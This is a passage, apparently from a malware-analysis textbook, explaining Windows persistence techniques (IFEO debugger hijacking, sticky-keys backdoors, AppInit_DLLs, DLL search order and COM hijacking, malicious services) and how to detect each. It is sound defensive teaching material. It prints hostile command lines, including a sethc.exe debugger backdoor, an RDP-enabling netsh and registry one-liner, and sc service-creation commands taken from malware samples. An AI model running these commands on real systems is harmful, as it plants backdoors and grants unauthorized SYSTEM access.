+<p class="calibre2">Adversaries take advantage of this registry key to launch their malicious program. To demonstrate this technique, the debugger for <kbd class="calibre13">notepad.exe</kbd> is set to a calculator (<kbd class="calibre13">calc.exe</kbd>) process by adding the following registry entry:</p>
+<div class="cdpaligncenter"><img src="../images/00215.jpeg" class="calibre41"/></div>
+<p class="calibre2">Now, when you start notepad, it will be launched by a calculator program (even though it is not a debugger). This behavior can be seen in the following screenshot:</p>
+<div class="cdpaligncenter"><img src="../images/00216.jpeg" class="calibre41"/></div>
+<p class="calibre2">The following is an example of a malware sample <em class="calibre17">(TrojanSpy:Win32/Small.M)</em> that configures its malicious program, <kbd class="calibre13">iexplor.exe</kbd>, as a debugger for internet explorer, (<kbd class="calibre13">iexplore.exe</kbd>). This is achieved by adding the following registry value. In this case, the attackers chose a filename that looks similar to the legitimate internet explorer executable name. Due to the following registry entry, whenever the legitimate internet explorer (<kbd class="calibre13">iexplore.exe</kbd>) is executed, it will be launched by the malicious program <kbd class="calibre13">iexplor.exe</kbd>, thereby executing the malicious code:</p>
+<pre class="calibre18">[<strong class="calibre1">RegSetValue</strong>] <strong class="calibre1">LSASSMGR.EXE</strong>:960 &gt; HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\<strong class="calibre1">Image File Execution Options\iexplore.exe\Debugger = C:\Program Files\Internet Explorer\iexplor.exe</strong></pre>
+<p class="calibre2">To detect this type of persistence technique, y<span class="calibre7">ou can inspect the I<em class="calibre17">mage File Execution Options</em> registry entry for any modifications not related to the legitimate programs.</span></p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.6 Accessibility Programs</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">The Windows operating system provides various accessibility features such as the <em class="calibre17">On-screen keyboard</em>, <em class="calibre17">Narrator</em>, <em class="calibre17">Magnifier</em>, <em class="calibre17">Speech recognition</em>, and so on. These features are mainly designed for people with special needs. These accessibility programs can be launched without even logging into the system. For example, many of these accessibility programs can be accessed by pressing the <em class="calibre17">Windows + U</em> key combination, which launches <kbd class="calibre13">C:\Windows\System32\utilman.exe</kbd>, or you can enable sticky keys by pressing the <em class="calibre17">shift key</em> five times, which will launch the program <kbd class="calibre13">C:\Windows\System32\sethc.exe</kbd><em class="calibre17">.</em> An attacker can change the way these accessibility programs (such as <kbd class="calibre13">sethc.exe</kbd> and <kbd class="calibre13">utilman.exe</kbd>) are launched to execute a program of their choice, or they can use <kbd class="calibre13">cmd.exe</kbd> with elevated privileges (privilege escalation).</p>
+<p class="calibre2">Adversaries use the sticky keys (<kbd class="calibre13">sethc.exe</kbd>) feature to gain unauthenticated access via Remote Desktop (RDP). In the case of the <em class="calibre17">Hikit</em> Rootkit, (<a href="https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html" class="calibre10">https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html</a>) the legitimate <kbd class="calibre13">sethc.exe</kbd> program was replaced with <kbd class="calibre13">cmd.exe</kbd>. This allowed the adversaries to access the command prompt with <em class="calibre17">SYSTEM</em> privileges over RDP just by pressing the <em class="calibre17">shift key</em> five times. While in the older versions of Windows it was possible to replace the accessibility program with another program, the newer versions of Windows enforces various restrictions such as the replaced binary must reside in <kbd class="calibre13">%systemdir%</kbd><strong class="calibre5">,</strong> it needs to be digitally signed for x64 systems, and it must be protected by <em class="calibre17">Windows File or Resource Protection (WFP/WRP)</em>. These restrictions make it hard for the adversaries to replace the legitimate programs (such as <kbd class="calibre13">sethc.exe</kbd>). To avoid replacing the files, adversaries make use of the <em class="calibre17">Image File Execution Options</em> (covered in the previous section), as shown in the following code. The following registry entry sets <kbd class="calibre13">cmd.exe</kbd> as the debugger for <kbd class="calibre13">sethc.exe</kbd>; now, an adversary can use RDP login and press the <em class="calibre17">Shift</em> key five times to get access to the System-level command shell. Using this shell, an adversary can execute any arbitrary commands even before authentication. In the same manner, a malicious backdoor program can be executed by setting it as a debugger for <kbd class="calibre13">sethc.exe</kbd> or <kbd class="calibre13">utilman.exe</kbd>:</p>
+<pre class="calibre18">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\<strong class="calibre1">Image File Execution Options\sethc.exe</strong>" /t REG_SZ /v <strong class="calibre1">Debugger</strong> /d "<strong class="calibre1">C:\windows\system32\cmd.exe</strong>" /f</pre>
+<p class="calibre2">In the following example, when a malware sample (<kbd class="calibre13">mets.exe</kbd>) is executed, it runs the following command, which modifies the firewall rules/registry to allow RDP connection and then adds a registry value to set the task manager (<kbd class="calibre13">taskmgr.exe</kbd>) as the debugger for <kbd class="calibre13">sethc.exe</kbd>. This allows an adversary to access <kbd class="calibre13">taskmgr.exe</kbd> over RDP (with SYSTEM privileges). Using this technique, an adversary can <em class="calibre17">kill a process</em> or s<em class="calibre17">tart/stop a service</em> over RDP without even logging in to the system:</p>
+<pre class="calibre18">[<strong class="calibre1">CreateProcess</strong>] <strong class="calibre1">mets.exe</strong>:564 &gt; "<strong class="calibre1">cmd /c netsh firewall add portopening tcp 3389 all</strong> &amp; reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\<strong class="calibre1">Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</strong> &amp; REG ADD HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\<strong class="calibre1">Image File Execution Options\sethc.exe /v Debugger /t REG_SZ /d %windir%\system32\taskmgr.exe /f</strong>"</pre>
+<p class="calibre2">This type of attack is slightly difficult to detect, because an attacker either replaces the accessibility programs with legitimate programs or makes use of legitimate programs. However, if you suspect that the accessibility program (<kbd class="calibre13">sethc.exe</kbd>) has been replaced with legitimate files, such as <kbd class="calibre13">cmd.exe</kbd> or <kbd class="calibre13">taskmgr.exe</kbd>, then you can compare the hash values of the replaced accessibility program with the hash values of the legitimate files (<kbd class="calibre13">cmd.exe</kbd> or <kbd class="calibre13">taskmgr.exe</kbd>) to look for a match. A hash value match is an indication that the original <kbd class="calibre13">sethc.exe</kbd> file was replaced. You can also inspect the <em class="calibre17">Image File Execution Options</em> registry entry for any suspicious modifications.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.7 AppInit_DLLs</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">The <kbd class="calibre13">AppInit_DLLs</kbd> feature in Windows provides a way to load custom DLLs into the address space of every interactive application. Once a DLL is loaded into the address space of any process, it can run within the context of that process and can hook well-known APIs to implement an alternate functionality. An attacker can achieve persistence for their malicious DLL by setting the <kbd class="calibre13">AppInit_DLLs</kbd> value in the following registry key. This value typically contains space or comma-delimited list of DLLs. All the DLLs specified here are loaded into every process that loads <kbd class="calibre13">User32.dll</kbd>. Since <kbd class="calibre13">User32.dll</kbd> is loaded by almost all of the processes, this technique enables the attacker to load their malicious DLL into most of the processes and executes the malicious code within the context of the loaded process. In addition to setting the <kbd class="calibre13">AppInit_DLLs</kbd> value, an attacker may also enable the <kbd class="calibre13">AppInit_DLLs</kbd> functionality by setting the <kbd class="calibre13">LoadAppInit_DLLs</kbd> registry value to <kbd class="calibre13">1</kbd>. The <kbd class="calibre13">AppInit_DLLs</kbd> functionality is disabled on Windows 8 and later versions, where the secure boot is enabled:</p>
+<pre class="calibre18">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</pre>
+<p class="calibre2">The following screenshot shows the AppInit DLL entries added by the <em class="calibre17">T9000 backdoor</em> (<a href="https://researchcenter.paloaltonetworks.com/2016/02/t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques/" class="calibre10">https://researchcenter.paloaltonetworks.com/2016/02/t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques/</a>):</p>
+<div class="cdpaligncenter"><img src="../images/00217.jpeg" class="calibre191"/></div>
+<p class="calibre2">As a result of adding the preceding registry entries, when any new process (that loads <kbd class="calibre13">User32.dll</kbd>) is started, it loads the malicious DLL (<kbd class="calibre13">ResN32.dll</kbd>) into its address space. The following screenshot displays the operating system's processes that loaded the malicious DLL (<kbd class="calibre13">ResN32.dll</kbd>) after rebooting the system. Since most of these processes run with high integrity levels, it allows an adversary to execute malicious code with elevated privileges:</p>
+<div class="cdpaligncenter"><img src="../images/00218.jpeg" class="calibre41"/></div>
+<p class="calibre2">To detect this technique, you can look for the suspicious entries in the <kbd class="calibre13">AppInit_DLLs</kbd> registry value, that do not relate to the legitimate programs in your environment. You can also look for any process exhibiting abnormal behavior due to the loading of the malicious DLL.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.8 DLL Search Order Hijacking</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">When a process is executed, its associated DLLs are loaded <span class="calibre7">into the process memory</span> (either via an <em class="calibre17">import table</em> or as a result of the process calling the <kbd class="calibre13">LoadLibrary()</kbd> API). The Windows operating system searches for the DLL to be loaded in a specific order in the predefined locations. The search order sequence is documented in the MSDN here: <a href="http://msdn.microsoft.com/en-us/library/ms682586(VS.85).aspx" class="calibre10">http://msdn.microsoft.com/en-us/library/ms682586(VS.85).aspx</a>.</p>
+<p class="calibre2">In short, if any DLL has to be loaded, the operating system first checks if the DLL is already loaded in the memory. If yes, it uses the loaded DLL. If not, it checks if the DLL is defined in the <kbd class="calibre13">KnownDLLs</kbd> registry key (<kbd class="calibre13">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</kbd>). The DLLs listed here are system DLLs (located in the <kbd class="calibre13">system32</kbd> directory), and they are protected using <em class="calibre17">Windows file protection</em> to ensure that these DLLs are not deleted or updated except by the operating system updates. If the DLL to be loaded in is in the list of <kbd class="calibre13">KnownDLLs</kbd>, then the DLL is always loaded from the <kbd class="calibre13">System32</kbd> directory. If these conditions are not met, then the operating system looks for the DLL in the following locations in sequential order:</p>
+<ol class="calibre14">
+<li class="calibre12" value="1">The directory from where the application was launched.</li>
+<li class="calibre12" value="2">The system directory (<kbd class="calibre13">C:\Windows\System32</kbd>).</li>
+<li class="calibre12" value="3">The 16-bit system directory (<kbd class="calibre13">C:\Windows\System</kbd>).</li>
+<li class="calibre12" value="4">The Windows directory (<kbd class="calibre13">C:\Windows</kbd>).</li>
+<li class="calibre12" value="5">The current directory.</li>
+<li class="calibre12" value="6">Directories defined in the <kbd class="calibre13">PATH</kbd> variables.</li>
+</ol>
+<p class="calibre2">Adversaries can take advantage of how the operating system searches for the DLL to escalate privilege and to achieve persistence. Consider the malware (<em class="calibre17">Prikormka dropper</em>) used in Operation Groundbait (<a href="http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf" class="calibre10">http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf</a>). This malware, upon execution, drops a malicious DLL called <kbd class="calibre13">samlib.dll</kbd> in the Windows directory (<kbd class="calibre13">C:\Windows</kbd>), as follows:</p>
+<pre class="calibre18">[CreateFile] toor.exe:4068 &gt; %WinDir%\samlib.dll</pre>
+<p class="calibre2">On a clean operating system, a DLL with the same name (<kbd class="calibre13">samlib.dll</kbd>) resides in the <kbd class="calibre13">C:\Windows\System32</kbd> directory and this clean DLL is loaded by <kbd class="calibre13">explorer.exe</kbd>, which resides in the <kbd class="calibre13">C:\Windows</kbd> dir<em class="calibre17">ectory.</em> The clean DLL is also loaded by few other processes which reside in the <kbd class="calibre13">system32</kbd> directory, as shown here:</p>
+<div class="cdpaligncenter"><img src="../images/00219.jpeg" class="calibre41"/></div>
+<p class="calibre2">Since the malicious DLL is dropped in the same directory as <kbd class="calibre13">explorer.exe</kbd> (which is <kbd class="calibre13">C:\Windows</kbd>), as a result, when the system reboots, the malicious <kbd class="calibre13">samlib.dll</kbd> is loaded by <kbd class="calibre13">explorer.exe</kbd> from the <kbd class="calibre13">C:\Windows</kbd> directory instead of the legitimate DLL from the <kbd class="calibre13">system32</kbd> directory. The following screenshot, taken after rebooting the infected system, displays the malicious DLL loaded by <kbd class="calibre13">explorer.exe</kbd> as a result of DLL search order hijacking:</p>
+<div class="cdpaligncenter"><img src="../images/00220.jpeg" class="calibre41"/></div>
+<p class="calibre2">The <em class="calibre17">DLL search order hijack</em> technique makes forensic analysis much harder and evades traditional defenses. To detect such attacks, you should consider monitoring the creation, renaming, replacing, or deletion of DLLs and look for any modules (DLLs) loaded by the processes from abnormal paths.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.9 COM hijacking</h1>
+                
+            
+            <article>
+                
+<p class="calibre2"><em class="calibre17">Component Object Model (COM)</em> is a system that allows the software components to interact and communicate with each other, even if they have no knowledge of each other's code (<a href="https://msdn.microsoft.com/en-us/library/ms694363(v=vs.85).aspx" class="calibre10">https://msdn.microsoft.com/en-us/library/ms694363(v=vs.85).aspx</a>). The software components interact with each other through the use of COM objects, and these objects can be within a single process, other processes, or on remote computers. COM is implemented as a client/server framework. A COM client is a program that uses the service from the COM server (COM object), and a COM server is an object which provides service to the COM clients. The COM server implements an interface consisting of various methods (functions), either in a DLL (called <em class="calibre17">in-process server</em>) or in an EXE (called <em class="calibre17">out-of-process server</em>). A COM client can utilize the service provided by COM server by creating an instance of the COM object, acquiring the pointer to the interface, and calling the method implemented in its interface.</p>
+<p class="calibre2">The Windows operating system provides various COM objects that can be used by the programs (COM client). The COM objects are identified by a unique number called <em class="calibre17">class identifiers</em> (<em class="calibre17">CLSIDs</em>), and they are typically found in the registry key <kbd class="calibre13">HKEY_CLASSES_ROOT\CLSID\&lt; unique clsid&gt;</kbd>. For example, the COM object for <em class="calibre17">My Computer</em> is <kbd class="calibre13">{20d04fe0-3aea-1069-a2d8-08002b30309d}</kbd>, which can be seen in the following screenshot:</p>
+<div class="cdpaligncenter"><img src="../images/00221.jpeg" class="calibre41"/></div>
+<p class="calibre2">For each CLSID key, you also have a subkey called <kbd class="calibre13">InProcServer32</kbd> that specifies the filename of the DLL that implements the COM server functionality. The following screenshot tells you that <kbd class="calibre13">shell32.dll</kbd> (COM server) is associated with <em class="calibre17">My computer</em>:</p>
+<div class="cdpaligncenter"><img src="../images/00222.jpeg" class="calibre41"/></div>
+<p class="calibre2">Similar to the <em class="calibre17">My Computer</em> COM object, Microsoft provides various other COM objects (implemented in DLLs) that are used by the legitimate programs. When the legitimate program (COM client) uses the service from a specific COM object (using its CLSID), its associated DLL gets loaded into the process address space of the client program. In the case of <em class="calibre17">COM Hijacking</em>, an attacker modifies the registry entry of a legitimate COM object and associates it with the attacker's malicious DLL. The idea is that when legitimate programs use the hijacked objects, the malicious DLL gets loaded into the address space of the legitimate program. This allows an adversary to persist on the system and execute malicious code.</p>
+<p class="calibre2">In the following example, upon executing the malware (<em class="calibre17">Trojan.Compfun</em>), it drops a <kbd class="calibre13">dll</kbd> with a <kbd class="calibre13">._dl</kbd> extension, as follows:</p>
+<pre class="calibre18">[CreateFile] ions.exe:2232 &gt; %WinDir%\system\api-ms-win-downlevel-qgwo-l1-1-0._dl</pre>
+<p class="calibre2">The malware then sets the following registry value in <kbd class="calibre13">HKCU\Software\Classes\CLSID</kbd>. This entry associates the COM object <kbd class="calibre13">{BCDE0395-E52F-467C-8E3D-C4579291692E}</kbd> of the <kbd class="calibre13">MMDeviceEnumerator</kbd> class with the malicious DLL <kbd class="calibre13">C:\Windows\system\api-ms-win-downlevel-qgwo-l1-1-0._dl</kbd> for the current user:</p>
+<pre class="calibre18">[<strong class="calibre1">RegSetValue</strong>] <strong class="calibre1">ions.exe</strong>:2232 &gt; HKCU\Software\Classes\CLSID\<strong class="calibre1">{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32\(Default) = C:\Windows\system\api-ms-win-downlevel-qgwo-l1-1-0._dl</strong></pre>
+<p class="calibre2">On a clean system, the COM object <kbd class="calibre13">{BCDE0395-E52F-467C-8E3D-C4579291692E}</kbd> of the <kbd class="calibre13">MMDeviceEnumerator</kbd> Class is associated with the DLL <kbd class="calibre13">MMDevApi.dll</kbd>, and its registry entry  is typically found in <kbd class="calibre13">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</kbd>, and no corresponding entry is found in <kbd class="calibre13">HKCU\Software\Classes\CLSID\</kbd>:</p>
+<div class="cdpaligncenter"><img src="../images/00223.jpeg" class="calibre41"/></div>
+<p class="calibre2">As a result of the malware adding an entry in <kbd class="calibre13">HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}</kbd>, the infected system now contains two registry entries for the same CLSID. Since the user objects from <kbd class="calibre13">HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}</kbd> get loaded before the machine objects located in <kbd class="calibre13">HKLM\SOFTWARE\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}</kbd>, the malicious DLL gets loaded, thereby hijacking the COM object of <kbd class="calibre13">MMDeviceEnumerator</kbd>. Now, any process that uses the <kbd class="calibre13">MMDeviceEnumerator</kbd> object loads the malicious DLL. The following screenshot was taken after restarting the infected system. After the restart, the malicious DLL was loaded by <kbd class="calibre13">explorer.exe</kbd>, as shown here:</p>
+<div class="cdpaligncenter"><img src="../images/00224.jpeg" class="calibre41"/></div>
+<p class="calibre2">The <em class="calibre17">COM hijacking</em> technique evades detection from most of the traditional tools. To detect this kind of attack, you can look for the presence of objects in <kbd class="calibre13">HKCU\Software\Classes\CLSID\</kbd>. Instead of adding an entry in <kbd class="calibre13">HKCU\Software\Classes\CLSID\</kbd>, malware may modify the existing entry in <kbd class="calibre13">HKLM\Software\Classes\CLSID\</kbd> to point to a malicious binary, so you should also consider checking for any value pointing to an unknown binary in this registry key.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">2.10 Service</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">A service is a program that runs in the background without any user interface, and it provides core operating system features such as event logging, printing, error reporting, and so on. An adversary with Administrator privilege can persist on the system by installing the malicious program as a service or by modifying an existing service. For an adversary, the advantage of using the service is that it can be set to start automatically when the operating system starts, and it mostly runs with a privileged account such as SYSTEM; this allows an attacker to elevate privileges. An attacker may implement the malicious program as an <em class="calibre17">EXE</em>, <em class="calibre17">DLL,</em> or <em class="calibre17">kernel driver</em> and run it as a service. Windows supports various service types, and the following outlines some of the common service types used by the malicious programs:</p>
+<ul class="calibre11">
+<li class="calibre12"><em class="calibre19">Win32OwnProcess</em>: The code for the service is implemented as an executable, and it runs as an individual process</li>
+<li class="calibre12"><em class="calibre19">Win32ShareProcess:</em> The code for the service is implemented as a DLL, and it runs from a shared host process (<kbd class="calibre13">svchost.exe</kbd>)</li>
+<li class="calibre12"><em class="calibre19">Kernel Driver Service:</em> This type of service is implemented in a driver (<kbd class="calibre13">.sys</kbd>), and it is used to execute the code in kernel space</li>
+</ul>
+<p class="calibre2">Windows stores the list of installed services and their configuration in the registry under the <kbd class="calibre13">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</kbd> key. Each service has its own subkey consisting of values that specify how, when, and whether the service is implemented in an <em class="calibre17">EXE</em>, <em class="calibre17">DLL,</em> or <em class="calibre17">kernel driver</em>. For example, the service name for the <em class="calibre17">Windows installer service</em> is <kbd class="calibre13">msiserver</kbd>, and in the following screenshot, a subkey is present with the same name as the service name under <kbd class="calibre13">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</kbd>. The <kbd class="calibre13">ImagePath</kbd> value specifies that the code for this service is implemented in <kbd class="calibre13">msiexec.exe</kbd>, the <kbd class="calibre13">Type</kbd> value of <kbd class="calibre13">0x10(16)</kbd> tells us that it is <kbd class="calibre13">Win32OwnProces<em class="calibre19">s</em></kbd>, and the <kbd class="calibre13">Start</kbd> value <kbd class="calibre13">0x3</kbd> represents <kbd class="calibre13">SERVICE_DEMAND_START</kbd>, which means that this service needs to be started manually:</p>
+<div class="cdpaligncenter"><img src="../images/00225.jpeg" class="calibre41"/></div>
+<p class="calibre2">To determine the symbolic name associated with the constant values, you can refer to the MSDN documentation for the <kbd class="calibre13">CreateService()</kbd> API (<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682450(v=vs.85).aspx" class="calibre10">https://msdn.microsoft.com/en-us/library/windows/desktop/ms682450(v=vs.85).aspx</a>), or you can query the service configuration using the <kbd class="calibre13">sc</kbd> utility by providing the service name, as shown here. This will display similar information that is found in the registry subkey:</p>
+<pre class="calibre18">C:\&gt;<strong class="calibre1">sc qc "msiserver"</strong><br class="title-page-name"/>[SC] QueryServiceConfig SUCCESS<br class="title-page-name"/><br class="title-page-name"/>SERVICE_NAME: <strong class="calibre1">msiserver</strong><br class="title-page-name"/>TYPE : <strong class="calibre1">10 WIN32_OWN_PROCESS</strong><br class="title-page-name"/>START_TYPE : <strong class="calibre1">3 DEMAND_START</strong><br class="title-page-name"/>ERROR_CONTROL : 1 NORMAL<br class="title-page-name"/>BINARY_PATH_NAME : <strong class="calibre1">C:\Windows\system32\msiexec.exe /V</strong><br class="title-page-name"/>LOAD_ORDER_GROUP :<br class="title-page-name"/>TAG : 0<br class="title-page-name"/>DISPLAY_NAME : Windows Installer<br class="title-page-name"/>DEPENDENCIES : rpcss<br class="title-page-name"/>SERVICE_START_NAME : LocalSystem</pre>
+<p class="calibre2">Let's now look at an example of the <em class="calibre17">Win32ShareProcess</em> service. The <em class="calibre17">Dnsclient</em> service has a service name of <kbd class="calibre13">Dnscache</kbd>, and code for the service is implemented in the DLL. When a service is implemented as a DLL (service DLL), the <kbd class="calibre13">ImagePath</kbd> registry value will typically contain the path to the <kbd class="calibre13">svchost.exe</kbd> (because that is the process that loads the Service DLL). To determine the DLL that is associated with the service, you will have to look at the <kbd class="calibre13">ServiceDLL</kbd> value, which is present under the <kbd class="calibre13">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\&lt;service name&gt;\Parameters</kbd> subkey. The following screenshot shows the DLL (<kbd class="calibre13">dnsrslvr.dll</kbd>) associated with the Dnsclient service; this DLL gets loaded by the generic host process <kbd class="calibre13">svchost.exe</kbd>:</p>
+<div class="cdpaligncenter"><img src="../images/00226.jpeg" class="calibre41"/></div>
+<p class="calibre2">An attacker can create services in many ways. The following outlines some of the common methods:</p>
+<ul class="calibre11">
+<li class="calibre12"><strong class="calibre1">sc utility:</strong> A malware can invoke <kbd class="calibre13">cmd.exe</kbd> and run an <kbd class="calibre13">sc</kbd> command such as <kbd class="calibre13">sc create</kbd> and <kbd class="calibre13">sc start</kbd> (or <kbd class="calibre13">net start</kbd>) to create and start the service, respectively. In the following example, malware executes the <kbd class="calibre13">sc</kbd> command (via <kbd class="calibre13">cmd.exe</kbd>) to create and start a service named <kbd class="calibre13">update</kbd>:</li>
+</ul>
+<pre class="calibre25">[<strong class="calibre1">CreateProcess</strong>] <strong class="calibre1">update.exe</strong>:3948 &gt; "%WinDir%\System32\<strong class="calibre1">cmd.exe /c sc create update binPath= C:\malware\update.exe start= auto &amp;&amp; sc start update</strong> "</pre>
+<ul class="calibre11">
+<li class="calibre12"><strong class="calibre1">Batch script</strong>: A malware can drop a batch script and execute the previously mentioned commands to create and start the service. In the following example, the malware (<em class="calibre19">Trojan:Win32/Skeeyah)</em> drops a batch script (<kbd class="calibre13">SACI_W732.bat</kbd>) and executes the batch script (via <kbd class="calibre13">cmd.exe</kbd>), which in turn creates and starts a service named <kbd class="calibre13">Saci</kbd>:</li>
+</ul>
+<pre class="calibre25">[<strong class="calibre1">CreateProcess</strong>] <strong class="calibre1">W732.exe</strong>:2836 &gt; "%WinDir%\system32\cmd.exe /c %LocalAppData%\Temp\6DF8.tmp\<strong class="calibre1">SACI_W732.bat</strong> "<br class="title-page-name"/>[<strong class="calibre1">CreateProcess</strong>] <strong class="calibre1">cmd.exe</strong>:2832 &gt; "<strong class="calibre1">sc create Saci binPath= %WinDir%\System32\Saci.exe type= own start= auto</strong>"<br class="title-page-name"/>[<strong class="calibre1">CreateProcess</strong>] <strong class="calibre1">cmd.exe</strong>:2832 &gt; "<strong class="calibre1">sc start Saci</strong>"</pre>
+<ul class="calibre11">
+<li class="calibre12"><strong class="calibre1">Windows API</strong>: The malware can use Windows API, such as <kbd class="calibre13">CreateService()</kbd> and <kbd class="calibre13">StartService()</kbd> to <em class="calibre19">create</em> and <em class="calibre19">start</em> the service. When you run <kbd class="calibre13">sc utility</kbd> in the background, it uses these API calls to create and start the service. Consider the following example of the <em class="calibre19">NetTraveler</em> malware. Upon execution, it first drops a dll:</li>
+</ul>
+<pre class="calibre25">[<strong class="calibre1">CreateFile</strong>] <strong class="calibre1">d3a.exe</strong>:2904 &gt; %WinDir%\System32\<strong class="calibre1">FastUserSwitchingCompatibilityex.dll</strong></pre>
+<p class="calibre2">It then opens a handle to the service control manager using the <kbd class="calibre13">OpenScManager()</kbd> API and creates a service of type <kbd class="calibre13">Win32ShareProcess</kbd> by calling the <kbd class="calibre13">CreateService()</kbd> API. The second argument specifies the name of the service, which in this case is <kbd class="calibre13">FastUserSwitchingCompatiblity</kbd>:</p>
+<div class="cdpaligncenter"><img src="../images/00227.jpeg" class="calibre192"/></div>
+<p class="calibre2">After the call to <kbd class="calibre13">CreateService()</kbd>, the service gets created, and the following registry key is added with service configuration information:</p>
+<div class="cdpaligncenter"><img src="../images/00228.jpeg" class="calibre41"/></div>
+<p class="calibre2">It then creates a <kbd class="calibre13">Parameters</kbd> subkey under the registry key created in the previous step:</p>
+<div class="cdpaligncenter"><img src="../images/00229.jpeg" class="calibre41"/></div>
+<p class="calibre2">After that, it drops and executes a batch script, which sets the registry value (<kbd class="calibre13">ServiceDll</kbd>) to associate the DLL with the created service. The content of the batch script is shown here:</p>
+<pre class="calibre18">@echo off<br class="title-page-name"/><br class="title-page-name"/>@reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FastUserSwitchingCompatibility\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\FastUserSwitchingCompatibilityex.dll</pre>
+<p class="calibre2">As a result of creating a <kbd class="calibre13">Win32ShareProcess</kbd> service, when the system boots, the service control manager (<kbd class="calibre13">services.exe</kbd>) starts the <kbd class="calibre13">svchost.exe</kbd> process, which in turn loads the malicious ServiceDLL <kbd class="calibre13">FastUserSwitchingCompatibilityex.dll</kbd>.</p>
+<ul class="calibre11">
+<li class="calibre12"><strong class="calibre1"> PowerShell and WMI</strong>: A service can also be created using management tools such as <em class="calibre19">PowerShell</em> (<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-service?view=powershell-5.1" class="calibre10">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-service?view=powershell-5.1</a>) and <em class="calibre19">Window Management Instrumentation (WMI)</em> high-level interfaces (<a href="https://msdn.microsoft.com/en-us/library/aa394418(v=vs.85).aspx" class="calibre10">https://msdn.microsoft.com/en-us/library/aa394418(v=vs.85).aspx</a>).</li>
+</ul>
+<p class="calibre2">Instead of creating a new service, an adversary can modify (hijack) the existing service. Normally, an attacker hijacks a service that is unused or disabled. This makes detection slightly harder because, if you are trying to find the nonstandard or unrecognized service, you will miss this type of attack. Consider the example of the <em class="calibre17">BlackEnergy</em> malware dropper, which <em class="calibre17">Hijacks</em> the existing service to persist on the system. Upon execution, <em class="calibre17">BlackEnergy</em> replaces a legitimate driver called <kbd class="calibre13">aliide.sys</kbd> (associated with the service named <kbd class="calibre13">aliide</kbd>) residing in the <kbd class="calibre13">system32\drivers</kbd> directory with the malicious <kbd class="calibre13">aliide.sys</kbd> driver. After replacing the driver, it modifies the registry entry associated with the <kbd class="calibre13">aliide</kbd> service and sets it to autostart (the service starts automatically when the system starts), as shown in the following events:</p>
+<pre class="calibre18">[<strong class="calibre1">CreateFile</strong>] <strong class="calibre1">big.exe</strong>:4004 &gt; %WinDir%\System32\drivers\<strong class="calibre1">aliide.sys</strong><br class="title-page-name"/>[<strong class="calibre1">RegSetValue</strong>] services.exe:504 &gt; HKLM\System\CurrentControlSet\services\<strong class="calibre1">aliide\Start = 2</strong></pre>
+<p class="calibre2">The following screenshot shows the service configuration of the <kbd class="calibre13">aliide</kbd> service before and after modification. For a detailed analysis of the <em class="calibre17">BlackEnergy3</em> big dropper, read the author's blog post here at: <a href="https://cysinfo.com/blackout-memory-analysis-of-blackenergy-big-dropper/" class="calibre10">https://cysinfo.com/blackout-memory-analysis-of-blackenergy-big-dropper/</a>:</p>
+<div class="cdpaligncenter"><img src="../images/00230.jpeg" class="calibre41"/></div>
+<p class="calibre2">To detect such attacks, monitor the changes to service registry entries that are not associated with the legitimate program. Look for the modification to the binary path associated with the service, and changes to the service startup type (from manual to automatic). You should also consider monitoring and logging the usage of tools such as <em class="calibre17">sc</em>, <em class="calibre17">PowerShell</em>, and <em class="calibre17">WMI,</em> which can be used to interact with the service. The Sysinternals <em class="calibre17">AutoRuns utility</em> can also be used to inspect the use of service for persistence.</p>
